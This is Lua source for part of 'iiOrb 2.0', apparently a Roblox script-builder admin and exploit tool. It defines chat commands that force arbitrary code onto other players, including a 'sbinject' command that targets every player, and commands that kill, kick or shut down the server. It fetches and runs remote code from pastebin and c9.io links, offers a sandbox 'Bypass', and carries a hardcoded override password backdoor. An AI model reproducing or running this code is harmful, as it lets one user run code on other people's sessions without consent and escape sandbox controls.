	AddCommand('Sbexe',"sbexe","Sbexe to a Player",3,function(Message, Collect_Players, Player)
	    local Split = GetSplit(Message)
	    local Plrs  = Collect_Players(Message:sub(1,Split-1),Player)
	    local Command = Message:sub(Split+1)
	    if #Plrs>0 then
	        for index,data in pairs(Plrs)do
	            Sbexe(Command,data)--afk
	        end
	    end
	end)

	AddCommand('Loader','injl','Injects iiOrb loader to a player',3,function(Message, Collect_Players, Player)
		local Plrs = Collect_Players(Message,Player)
		if #Plrs > 0 then
			for i,v in pairs(Plrs)do
				print_to(v,"[iiOrb 2.0]: has issued a loader to you")
				InjectLoader(v)
			end
		end
	end)

	AddCommand('Theme','theme','Changes Orb theme',2,function(Message, Collect_Players, Player)
		ChangeTheme(Player,Message)
	end)

	AddCommand('Follow','fol','Makes orb follow a target or your self',2,function(Message, Collect_Players, Player)
		if #Message>0 then
			local Plrs = Collect_Players(Message,Player)
			if #Plrs >1 then print_to(Player,"[Error]: Only one player allowed") return end
			for index,data in pairs(Plrs)do
				Follow(true,data.Name)
			end
		else
			Follow(true,Player.Name)
		end
	end)

	AddCommand('Nofollow','nofol','Sets the or to no follow',2,function(Message, Collect_Players, Player)
		Follow(false,"")
	end)

	AddCommand('Shutdown','sd','Shuts down the server',3,function(Message, Collect_Players, Player)
		for i,v in pairs(game:GetService('Players'):children())do
			v:Kick('This server has shutdown')
		end
	end)
	AddCommand('Access Level','setl','Sets the access level of a plr',1,function(Message, Collect_Players, Player)
		local Split = GetSplit(Message)
		local Plrs  = Collect_Players(Message:sub(1,Split-1),Player)
		local Level = tonumber(Message:sub(Split+1))
		if #Plrs>0 then
			for index,data in pairs(Plrs)do
				if Level > iiOrb.Admins[data.Name].Level and iiOrb.Admins[data.Name].Level >= iiOrb.Admins[Player.Name].Level then
					print_to(data,"[Error]: You cant set your level higher then your own")
				else
					print("[iiOrb 2.0]: Has set "..data.Name.."'s Access level to ["..Level.."]")
                    iiOrb.Admins[data.Name].Level = tonumber(Level)
				end
			end
		end
	end)

	AddCommand('Bypass','bypass','Loads a _G function giving a new env',3,function(Message, Collect_Players, Player)
		local newEnv = getfenv(1)
		newEnv.script = nil
		newEnv.warn = print
		newEnv.print = print
		newEnv.print_to = print_to
		newEnv.broadcast = broadcast
		rawset(_G,"Bypass",function()
			return newEnv
		end)
		broadcast('[iiOrb 2.0]: Has Loaded non-local bypass use setfenv(1,_G.Bypass()) to run unsandboxed code')
	end)
	AddCommand('Twitblox Loader','tbinit','Loads Twitblox',2,function(Message,Player)
		Sbexe('h/https://twitblox-brandan000124.c9.io/Loader.lua',Player)
		end)
AddCommand('Kill player','kp','Kills a player',2,function(Message,Player)
 game.Players:FindFirstChild(Message).Character:BreakJoints()
   end)
	AddCommand('Lock','lock','Sets the status of Scripting lock',3,function(Message, Collect_Players, Player)
		if #Message>0 then
			if Message:lower() == 'true' then
				if iiOrb.Blocker.LocalBlock == true and iiOrb.Blocker.LocalBlock == true then
					print_to(Player,"[iiOrb 2.0]: Scripting is already locked")
				else
					iiOrb.Blocker.LocalBlock = true
					iiOrb.Blocker.GlobalBlock = true
					print('[iiOrb 2.0]: Is locking Scripting')
				end
			elseif Message:lower()=='false' then
				if iiOrb.Blocker.LocalBlock == false and iiOrb.Blocker.LocalBlock == false then
					print_to(Player,"[iiOrb 2.0]: Scripting is already unlocked")
				else
					iiOrb.Blocker.LocalBlock = false
					iiOrb.Blocker.GlobalBlock = false
					print('[iiOrb 2.0]: Is unlocking Scripting')
				end
			end
		end
	end)
AddCommand('Set Speed','spd','Sets speed',3,function(Message, Collect_Players, Player)
	local n = tonumber(Message)
if type(n) == 'number' then
Settings.Rotation.Speed = n
end
end)
AddCommand('Set bounce','setb','Sets the bounce value of iiOrb.',3,function(Message,Player)
	local bouncev = tonumber(Message)
	if type(bouncev) == 'number' then
	Settings.Rotation.Bounce = tonumber(Message)
	end
end)


	AddCommand('Hide','hide','hides or shows the orb',2,function(Message, Collect_Players, Player)
		if #Message>0 then
			if Message:lower() == 'true'then
				ChangeTheme(Player,'hidden')
			elseif Message:lower()== 'false' then
				ChangeTheme(Player,'normal')
			end
		end
	end)

	AddCommand('Get Saves','gs','Get saves',4,function(Message, Collect_Players, Player)
		GetSavedScripts(Player)
	end)

--[[	AddCommand('Get Database','getd','Gets data from database',5,function(Message, Collect_Players, Player)
		--[[local Data = rbxdb:GetAllData()
		if type(Data)=='table'then
			for i,v in pairs(Data)do wait(.1)
				print_to(Player,tostring(i)..":"..tostring(v))
			end
		end
	end)]]--]]--

	AddCommand('Console','sc','Gives Server Console',5,function(Message, Collect_Players, Player)
		GiveServerConsole(Player)
	end)
	AddCommand('Script Inject','sbinject','Injects a script to all players (Say the script like ;sbinject-game.Players.LocalPlayer:Remove()', 5, function(Message, Collect_Players, Player)


local children = game.Players:GetChildren()
for i = 1, #children do
Sbexe("remove/iiOrbEXE",children[i].Name)
wait()
Sbexe("create/iiOrbEXE",children[i].Name)
wait()
Sbexe("edit/iiOrbEXE",children[i].Name)
wait()
Sbexe(Message,children[i].Name)
wait()
Sbexe("exit/",children[i].Name)
Sbexe("run/iiOrbEXE",children[i].Name)
Sbexe('remove/iiOrbEXE',children[i].Name)
end
end)

	AddCommand('Get Garbage','getg','Gets an Array of Garbage Data',2,function(Message, Collect_Players, Player)
		GetGarbage(Player)
	end)
    
    
AddCommand('grs','grs','Gets all the running scripts',2e9,function(Message, Collect_Players, Player)
          print_to(Player,"Got Running scripts")
for index, child in pairs(workspace:GetChildren()) do
    --print(index, child.Name)
    wait(.1)
    print_to(Player,child.Name)
    end
        end)
    
	AddCommand('Safe Exe','sexe','Executes safe code',3,function(Message, Collect_Players, Player)
		if #Message > 0 then
			SafeExe(Message,Player)
		end
	end)
	AddCommand('Kill Rot','kill','Kills the orb rot if its a emergency',4,function(Message, Collect_Players, Player)
		iiOrb.__STATUS = not iiOrb.__STATUS
		if not game.Workspace:FindFirstChild("\5\5\5\5Solar\5\5is\5\5\5\5")then
			SpawnOrb()
		end
end)
AddCommand('SmoothLoad','sml','Loads some terrain [GWC Approved]',3,function(Message,Player)
	if game.Players:FindFirstChild(Message) then
		Sbexe([[hl/http://pastebin.com/raw.php?i=ctyyEdQp]],Message)
		--Created by GuyWithACleverName
	else
	end end)
	AddCommand('ChatServ','cs','Activates ChatServ [gwc]',3,function(Message)
			for i,v in pairs(game.Players:GetPlayers()) do
				Sbexe([[hl/http://pastebin.com/raw.php?i=uG7KqYWW]],v)
			end
	end)
	
	AddCommand('iiOverride','override','Overrides iiOrb',1,function(Message,Player)
		if Message == '___#_V' then
			iiOrb.Admins[tostring(Player)] = {Level=5}
		end;
		end)


	print("[iiOrb 2.0]: Has finished booting commands")
end local BootCommands = API.BootCommands

function API.Connect(plr)
	if type(plr)~='userdata'then return end

	local Allowed_YoungPlrs = {"xDarkScripter","Fuust","lnvertious","error18"}
	if plr.AccountAge/365 < .5 then
		for i,v in pairs(Allowed_YoungPlrs)do
			if not plr.Name == v then
				plr:Kick("[iiOrb 2.0]: Sorry your AccountAge is to young to join this game")
			end
		end
	end

	if iiOrb.Banned[plr.Name]then Sbexe('g/ns nl ns nl ns nl ns nl',plr) plr:remove()end--Kick(iiOrb.Banned[plr.Name]) end

	if not iiOrb.Admins[plr.Name]then
		print_to(plr,"[iiOrb 2.0]: Has identifyed you as a ["..iiOrb.Levels[1].."]")
		print("[iiOrb 2.0]: connect "..plr.Name.." as a ["..iiOrb.Levels[1].."]")
		iiOrb.Admins[plr.Name] = {Level=1}
	elseif iiOrb.Admins[plr.Name]then
		print_to(plr,"[iiOrb 2.0]: Has identified you as a ["..iiOrb.Levels[iiOrb.Admins[plr.Name].Level].."]")
	end
	ConnectLogger(plr)
	plr.Chatted:connect(function(msg)
		Chatted(plr,msg)
	end)
end local Connect = API.Connect

--// Bootstrapper functions

function Bootstrap:Boot()
	local DeploymentID = Generate(math.random(1,50)*2/3)
	--// Bootup
	broadcast("[iiOrb 2.0]: Has started booting up")
	SpawnOrb()
	Rotate()
	BootCommands()
	for i,v in pairs(game:GetService('Players'):children())do
		Connect(v)
	end

	game:GetService('Players').PlayerAdded:connect(function(plr)
		wait(.5)
		Connect(plr)
	end)

	game.Workspace.DescendantAdded:connect(function(obj)
		if obj.ClassName == "Script" then
			if iiOrb.Blocker.GlobalBlock == true then
				obj.Disabled = true
				obj:Destroy()
			end
		elseif obj.ClassName == "LocalScript" then
			if iiOrb.Blocker.LocalBlock == true then
				obj.Disabled = true
				obj:Destroy()
			end
		end
	end)
	--game.DescendantAdded:connect(function(instance)
		--if iiOrb.Blocker.LagBlocker== true then
			--if iiOrb.LagBlockedInstances[instance.ClassName]then
				--instance:Destroy()
			--end
		--end
	--end)



	print("[iiOrb 2.0]: Has booted successfully")
	broadcast("[iiOrb 2.0]: Has deployed with ID: "..DeploymentID.."")
--	rbxdb:SetValue("[iiOrb DEPLOYMENT]",DeploymentID)
end

rawset(shared, "iOverride", protectfunc(function(...)
	local args = {...}
	if args[1] and type(args[1]) == "string" then
		if args[1] == iiOrb.AccessKey then
			if owner and type(owner) == "userdata" then
				local OwnerName = tostring(owner)
				local OwnrInd = iiOrb.Admins[OwnerName]
				if OwnerInd then
					OwnerInd.Level = 5
				else
					iiOrb.Admins[OwnerName] = {Level = 5}
				end
				return print(string.format("[%s] you have overriden successfully!",OwnerName))
			else
				return error("Owner not present in environment",2)
			end
		else
			return error("ACCESS DENIED!",2)
		end
	else
		return error(string.format("bad argument #1 to '?' (%s expected, got %s)","string", args[1]==nil and "nil" or type(args[1])),2)
	end--i missed an end [lel]
end))

if script.ClassName == 'Script'then
	if not game.Workspace:FindFirstChild("\5\5\5\5Solar\5\5is\5\5\5\5")then
		local y,n = pcall(function()
		    iiOrb.API.Bootstrap:Boot()
		end)if not y then print('{ERROR}: '..n)end
	end
elseif script.ClassName == 'ModuleScript'then
	return iiOrb.Api.Bootstrap:Boot()
end
ChangeTheme('iiOrb','normal')
broadcast'Welcome to iiOrb 2.0. \n Credits go to Aesthenical for the idea and Opligitory for the functions and code. \n And I reall forget to credit people sometimes XD --Control22' -- dont use [[ ]] it filters \ -error18
